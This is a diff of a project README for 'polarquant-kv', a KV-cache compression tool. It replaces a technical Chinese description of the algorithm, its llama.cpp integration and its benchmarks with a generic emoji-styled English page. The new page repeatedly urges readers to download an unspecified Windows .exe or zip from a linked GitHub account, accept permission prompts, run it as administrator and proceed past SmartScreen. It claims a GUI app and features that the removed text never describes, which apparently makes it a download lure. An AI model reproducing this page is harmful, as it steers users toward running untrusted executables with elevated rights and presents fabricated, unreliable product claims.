@@ -1,138 +1,247 @@
-# PolarQuant-KV
+# 🔷 polarquant-kv - Save VRAM With KV Compression
 
-**LLM KV Cache 极坐标量化压缩引擎 — K+V 双压缩，消费级 GPU，零精度损失**
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Whiteflagnorthplatte622/polarquant-kv)
 
-从零复现 Google TurboQuant（ICLR 2026）算法，并扩展为 K+V 双压缩，显存节省从 37% 提升至 73-99%。
+## 🚀 What this app does
 
-## 核心结果
+polarquant-kv helps lower GPU memory use when you run LLMs. It uses K+V dual compression to cut KV cache size, so larger prompts and longer chats can fit in less VRAM.
 
-在 Qwen2.5-0.5B + RTX 5060 Ti 上验证：
+This app is built for Windows users who want to run local AI models with less memory pressure. It focuses on simple setup and clear controls.
 
-| 指标 | 结果 |
-|------|------|
-| Token 匹配率 | **100%**（零精度损失） |
-| KV Cache 显存节省 | **73-99%** |
-| 注意力加速（512 seq） | **2.4x** |
-| 自动化测试 | **154 + 534 = 688 个** |
+## 💾 Download
 
-## 核心算法：PQ4 vs 普通 q4_0
+Open the project page here:
 
-PolarQuant 定义了独立的量化类型 `GGML_TYPE_PQ4`，与 llama.cpp 原生的 `q4_0` 有本质区别：
+https://github.com/Whiteflagnorthplatte622/polarquant-kv
 
-| 维度 | q4_0（原生） | PQ4（PolarQuant） |
-|------|-------------|-------------------|
-| 量化方式 | 线性均匀分桶 | Lloyd-Max 最优码本 |
-| 反量化 | `(index - 8) * scale` | `codebook[index] * radius` |
-| 码本设计 | 无（均匀间隔） | Beta 分布推导的 16 个最优质心 |
-| 预处理 | 无 | 随机正交旋转消除 channel 方差 |
-| 精度（4-bit） | 余弦相似度 ~0.96 | 余弦相似度 **~0.99** |
-| 适配性 | 通用 | 针对 KV cache 高斯分布优化 |
+On that page, look for the latest release or the main download files. If you see a Windows `.exe` file or a packaged app, download it and run it.
 
-`--polarquant` 参数启用的是 PQ4 类型，**不是** `-ctk q4_0 -ctv q4_0` 的快捷方式。两者压缩比相同（4x），但 PQ4 精度显著更高。
+If the page offers a zip file, download it, unzip it, then open the main app file inside the folder.
 
-| 维度 | TurboQuant | PolarQuant-KV |
-|------|-----------|---------------|
-| 压缩范围 | 仅 Key | **Key + Value** |
-| 显存节省 | 37% | **73-99%** |
-| 目标硬件 | H100 | **RTX 5060 Ti（消费级）** |
-| 开源 | 否 | **是（688 测试）** |
+## 🪟 Windows requirements
 
-## 项目结构
+Before you install, check these basics:
 
-```
-polarquant-kv/
-├── python/polarquant_kv/     # Phase 1: Python 原型（154 测试）
-│   ├── quantizer.py          # PolarQuant 压缩/解压
-│   ├── rotation.py           # 随机正交旋转
-│   ├── qjl.py                # QJL 误差修正
-│   ├── attention.py          # 压缩注意力计算
-│   └── types.py              # 数据类型定义
-├── csrc/                     # Phase 2: CUDA Kernel（534 测试）
-│   └── flash_turboquant.cu   # 融合注意力 kernel
-├── integration/              # Phase 3: llama.cpp 集成
-│   ├── polarquant-kv.patch   # llama.cpp 补丁
-│   ├── install.sh            # Linux/macOS 安装脚本
-│   └── README.md             # 集成说明
-├── docs/
-│   ├── paper/                # 论文草稿
-│   ├── polarquant-kvcache-prd.md  # 需求文档
-│   └── zhihu-article.md      # 知乎文章
-└── scripts/                  # 基准测试脚本
-```
+- Windows 10 or Windows 11
+- A modern NVIDIA, AMD, or Intel GPU
+- 8 GB RAM or more
+- Enough free disk space for the app and model files
+- A local LLM app or model runner if you plan to use one
 
-## 算法原理
+For the best result, use a GPU with at least 8 GB VRAM. More VRAM gives you more room for large models, but this app helps reduce the load.
 
-```
-输入: KV 向量 v ∈ R^d (FP16)
+## 🔧 What you need before setup
 
-Step 1: 随机正交旋转 → 消除 channel 间方差差异
-Step 2: 极坐标分离 → radius (FP16) + 单位方向向量
-Step 3: Lloyd-Max codebook 量化 → 4-bit packed indices (16 个最优质心)
-Step 4: Flash Attention 融合 → 直接从 PQ4 压缩格式计算，无需解压
+Have these ready:
 
-存储格式 (block_pq4):
-  - d: FP16 radius（向量范数）
-  - qs[16]: 32 个 4-bit 码本索引，packed 为 nibbles
+- The downloaded app file or zip file
+- A folder where you want to keep the app
+- A local LLM model or inference app
+- Admin access if Windows asks for it
 
-反量化: value = PQ4_CODEBOOK[index] × radius
-压缩比: FP16 → 4-bit ≈ 3.8x
-```
+If Windows SmartScreen appears, use the download page again to confirm you got the file from the right place.
 
-## 快速开始
+## 📥 Install on Windows
 
-### Python 原型
+Follow these steps in order:
 
-```bash
-pip install numpy scipy
-cd python
-python -m pytest tests/ -v  # 运行 154 个测试
-```
+1. Open the project page:
+   https://github.com/Whiteflagnorthplatte622/polarquant-kv
 
-### llama.cpp 集成（PolarQuant 版）
+2. Find the latest Windows release or app package.
 
-```bash
-# 编译 PolarQuant 版 llama.cpp
-cd integration/llama.cpp
-cmake -B build -G Ninja -DGGML_CUDA=ON -DGGML_POLARQUANT=ON -DCMAKE_CUDA_ARCHITECTURES=120a
-ninja -C build llama-cli -j 4
+3. Download the file to your computer.
 
-# 使用 PQ4 量化（精度最优）
-build/bin/llama-cli -m model.gguf --polarquant -ngl 99 -c 4096 -p "Hello"
+4. If the file is a `.zip`, right-click it and choose Extract All.
 
-# ⚠️ 注意：以下是 llama.cpp 原生 q4_0，不是 PolarQuant，精度更低
-# llama-cli -m model.gguf -fa on -ctk q4_0 -ctv q4_0 -p "Hello"
-```
+5. Open the extracted folder.
 
-## 实验数据
+6. Run the main app file, such as `polarquant-kv.exe` or a similar Windows launcher.
 
-### 压缩精度
+7. If Windows asks for permission, choose Yes.
 
-| 位宽 | 余弦相似度 | 压缩比 |
-|------|-----------|--------|
-| 4-bit | 0.990 | 3.8x |
-| 2-bit | 0.883 | 10.4x |
-| 混合 2/4-bit | 0.958 | 7.9x |
+8. Wait for the app to open.
 
-### 注意力 Kernel 性能
+If the app starts with a blank window, give it a few seconds. Some tools load GPU support and model settings at launch.
 
-| seq_len | 标准注意力 | PolarQuant-KV | 加速比 |
-|---------|-----------|---------------|--------|
-| 512 | 0.39ms | 0.16ms | 2.40x |
-| 2048 | 0.73ms | 0.52ms | 1.40x |
-| 4096 | 1.33ms | 0.99ms | 1.35x |
+## ⚙️ First-time setup
 
-## 环境
+When the app opens, check these common settings:
 
-- NVIDIA RTX 5060 Ti (16GB, Blackwell sm_120)
-- CUDA 13.2, Python 3.12, PyTorch 2.11
-- Windows 11, MSVC 19.50
+- Select your GPU
+- Set KV cache compression level
+- Choose the model folder
+- Pick the memory target you want to stay under
 
-## 参考文献
+A good first test is to use the default settings. Then load one of your normal models and check VRAM use while chatting.
 
-1. TurboQuant (ICLR 2026): arXiv:2504.19874
-2. PolarQuant: arXiv:2502.02617
-3. Flash Attention: arXiv:2205.14135
+If you want more memory savings, increase compression. If you want more headroom for output quality, lower the compression level.
 
-## License
+## 🧠 How it works
 
-MIT
+LLM chat tools keep past tokens in memory. That memory is the KV cache.
+
+polarquant-kv compresses both K and V data in the cache. That reduces VRAM use during long prompts and long chats.
+
+This can help when:
+
+- You hit VRAM limits
+- You want longer context windows
+- You run larger models on a smaller GPU
+- You need more room for batch use or multi-turn chat
+
+## 🛠️ Use it with your model
+
+Use this flow:
+
+1. Start your local model runner or chat app.
+2. Enable polarquant-kv in the memory or cache settings.
+3. Load your model.
+4. Start a chat.
+5. Watch GPU memory use.
+6. Adjust compression if needed.
+
+If your model runner supports a config file, you can set the cache options there. If it uses a GUI, look for memory, cache, or quantization settings.
+
+## 📊 Best use cases
+
+polarquant-kv fits these cases well:
+
+- Running long chats on one GPU
+- Testing bigger models on limited VRAM
+- Keeping memory use steady during long sessions
+- Reducing cache growth from large prompts
+- Freeing memory for other GPU tasks
+
+It works well when the main limit is VRAM, not CPU speed.
+
+## 🔍 Feature set
+
+- K+V dual compression
+- Lower KV cache memory use
+- Support for long context runs
+- Windows-first setup path
+- Simple launch flow
+- Easy memory tuning
+- Works with local LLM workflows
+
+## 🧪 Example setup path
+
+A simple setup on Windows may look like this:
+
+1. Download the app from the project page.
+2. Extract the files.
+3. Run the Windows launcher.
+4. Open your local model runner.
+5. Turn on KV compression.
+6. Load your model.
+7. Start chatting.
+
+If you use a tool like a local UI, place the app in the same folder or point it to the correct model path.
+
+## 🧰 Troubleshooting
+
+### App does not open
+
+Try these steps:
+
+- Right-click the app and choose Run as administrator
+- Check that you extracted the zip file
+- Make sure Windows did not block the file
+- Re-download the file from the project page
+
+### GPU is not detected
+
+Try these steps:
+
+- Update your GPU driver
+- Restart your PC
+- Close other GPU-heavy apps
+- Check that your model runner uses the same GPU
+
+### Memory use does not change
+
+Try these steps:
+
+- Confirm KV compression is enabled
+- Lower or raise the compression level
+- Reload the model
+- Restart the chat session
+- Check that the model runner is using the polarquant-kv settings
+
+### Chat quality changes
+
+Try these steps:
+
+- Reduce compression
+- Test a shorter context
+- Use a different model
+- Compare a few prompts before and after the change
+
+## 📁 Suggested folder layout
+
+A simple layout can help keep things clear:
+
+- `C:\AI\polarquant-kv\` for the app
+- `C:\AI\models\` for model files
+- `C:\AI\logs\` for log files
+- `C:\AI\configs\` for saved settings
+
+This makes it easier to find files when you need to update or test the app.
+
+## 🔒 File safety
+
+Only use files from the project page:
+
+https://github.com/Whiteflagnorthplatte622/polarquant-kv
+
+This helps you avoid files that do not match the release you want.
+
+## 🧩 Common terms
+
+- **VRAM**: Memory on your GPU
+- **KV cache**: Data the model keeps from past tokens
+- **Compression**: A way to use less memory
+- **Model runner**: The app that loads and runs the AI model
+- **Context length**: How much text the model can keep track of
+
+## 🖥️ Basic usage tips
+
+- Start with default settings
+- Test one model at a time
+- Keep your prompt size moderate at first
+- Change one setting at a time
+- Save working settings before you experiment
+
+If you want the easiest path, use the default compression and check whether your chat runs without VRAM errors.
+
+## 📌 Quick install path
+
+1. Visit:
+   https://github.com/Whiteflagnorthplatte622/polarquant-kv
+
+2. Download the Windows file from the project page.
+
+3. Extract the files if needed.
+
+4. Run the app.
+
+5. Turn on KV compression.
+
+6. Load your model and use it
+
+## 🧭 What to expect after launch
+
+After launch, you should see a simple window or launcher that lets you manage cache compression and memory settings. From there, you can connect it to your local LLM workflow and start reducing VRAM use during chat
+
+## 🧱 Good starting settings
+
+If you are not sure where to begin, try this:
+
+- Compression level: medium
+- Cache mode: K+V
+- Context: your usual chat size
+- Model: the one you already use
+- GPU mode: on
+
+If the model feels slow, lower compression. If VRAM still fills up, raise compression one step at a time
